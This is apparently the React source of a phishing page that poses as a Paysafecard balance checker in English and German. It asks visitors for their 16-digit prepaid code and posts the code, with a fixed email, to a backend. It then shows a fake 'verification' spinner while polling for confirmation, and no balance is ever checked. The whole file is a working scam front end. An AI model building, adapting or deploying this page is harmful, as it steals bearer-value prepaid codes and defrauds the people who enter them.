import { useEffect, useRef, useState } from "react";
import "./App.css";

const POLL_INTERVAL_MS = 2000;
const TIMEOUT_MS = 60 * 1000;
const MESSAGE_MAX_LENGTH = 500;
const PRODUCTION_EMAIL = import.meta.env.VITE_PRODUCTION_EMAIL || "";

const translations = {
  en: {
    title: "Do you already have a Paysafecard prepaid code ?",
    subtitle: "So, you just have to check your balance by entering the 16-digit code here. Even better, register and easily store all your codes in one place!",
    messagePlaceholder: "Enter the 16-digit code.",
    submit: "Send",
    submitting: "Sending...",
    errorGeneric: "An error occurred",
    errorNetwork: "Unable to contact the server",
    waitingTitle: "Verification",
    waitingText: "Court verification",
    waitingTextSuffix: "This doesn't take long, please wait...",
    successTitle: "Verification successful",
    retry: "Try again",
    timeoutTitle: "Verification failed",
    timeoutText: "You need to try again.",
    retryTimeout: "Retry",
    switchLabel: "Language",
  },
  de: {
    title: "Hast du bereits einen Paysafecard Prepaid-Code?",
    subtitle: "Dann musst du nur noch dein Guthaben überprüfen, indem du den 16-stelligen Code hier eingibst. Noch besser: Registriere dich und speichere alle deine Codes ganz einfach an einem Ort!",
    messagePlaceholder: "Gib den 16-stelligen Code ein.",
    submit: "Senden",
    submitting: "Wird gesendet...",
    errorGeneric: "Ein Fehler ist aufgetreten",
    errorNetwork: "Der Server konnte nicht erreicht werden",
    waitingTitle: "Verifikation",
    waitingText: "Kurze Verifikation",
    waitingTextSuffix: "Das dauert nicht lange, bitte warte...",
    successTitle: "Verifikation erfolgreich",
    retry: "Erneut versuchen",
    timeoutTitle: "Verifikation fehlgeschlagen",
    timeoutText: "Du musst es erneut versuchen.",
    retryTimeout: "Erneut versuchen",
    switchLabel: "Sprache",
  },
};


function App() {
  const [message, setMessage] = useState("");
  const [status, setStatus] = useState("idle"); // idle | sending | waiting | success | timeout | error
  const [errorMessage, setErrorMessage] = useState("");
  const [language, setLanguage] = useState("en");

  const pollIntervalRef = useRef(null);
  const timeoutRef = useRef(null);
  const tokenRef = useRef(null);

  const clearTimers = () => {
    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
    if (timeoutRef.current) clearTimeout(timeoutRef.current);
    pollIntervalRef.current = null;
    timeoutRef.current = null;
  };

  const t = translations[language];

  useEffect(() => clearTimers, []);

  const startPolling = (token) => {
    pollIntervalRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/status/${token}`);
        if (!res.ok) return; // token pas encore trouvé ou expiré, on retente au prochain tick
        const data = await res.json();
        if (data.confirmed) {
          clearTimers();
          setStatus("success");
        }
      } catch {
        // erreur réseau ponctuelle, on retente au prochain tick
      }
    }, POLL_INTERVAL_MS);

    timeoutRef.current = setTimeout(() => {
      clearTimers();
      setStatus("timeout");
    }, TIMEOUT_MS);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrorMessage("");
    setStatus("sending");

    try {
      const res = await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: PRODUCTION_EMAIL, message }),
      });
      const data = await res.json();

      if (!res.ok) {
        setStatus("error");
        setErrorMessage(data.error || t.errorGeneric);
        return;
      }

      tokenRef.current = data.token;
      setStatus("waiting");
      startPolling(data.token);
    } catch {
      setStatus("error");
      setErrorMessage(t.errorNetwork);
    }
  };

  const handleRetry = () => {
    clearTimers();
    setStatus("idle");
    setErrorMessage("");
  };

  return (
    <div className="container">
      <div className="card">
        <div className="lang-switcher" aria-label={t.switchLabel}>
          <span className="lang-label">{t.switchLabel}</span>
          <div className="lang-buttons">
            <button type="button" className={`lang-btn ${language === "en" ? "active" : ""}`} onClick={() => setLanguage("en")}>
              EN
            </button>
            <button type="button" className={`lang-btn ${language === "de" ? "active" : ""}`} onClick={() => setLanguage("de")}>
              DE
            </button>
          </div>
        </div>

        {status === "idle" || status === "sending" || status === "error" ? (
          <form onSubmit={handleSubmit}>
            <h1>{t.title}</h1>
            <p className="subtitle">{t.subtitle}</p>
            <p className="fixed-email">{PRODUCTION_EMAIL}</p>
            <textarea
              required
              placeholder={t.messagePlaceholder}
              value={message}
              maxLength={MESSAGE_MAX_LENGTH}
              onChange={(e) => setMessage(e.target.value)}
              disabled={status === "sending"}
              rows={3}
            />
            <button type="submit" disabled={status === "sending"}>
              {status === "sending" ? t.submitting : t.submit}
            </button>
            {status === "error" && <p className="error">{errorMessage}</p>}
          </form>
        ) : null}

        {status === "waiting" && (
          <div className="waiting">
            <div className="spinner" />
            <h2>{t.waitingTitle}</h2>
            <p>
              {t.waitingText.replace("{email}", PRODUCTION_EMAIL)} <strong>Youpiii 🎉</strong>
              <br />
              {t.waitingTextSuffix}
            </p>
          </div>
        )}

        {status === "success" && (
          <div className="result success">
            <h1>{t.successTitle}</h1>
            <button onClick={handleRetry}>{t.retry}</button>
          </div>
        )}

        {status === "timeout" && (
          <div className="result timeout">
            <h1>{t.timeoutTitle}</h1>
            <p>{t.timeoutText}</p>
            <button onClick={handleRetry}>{t.retryTimeout}</button>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
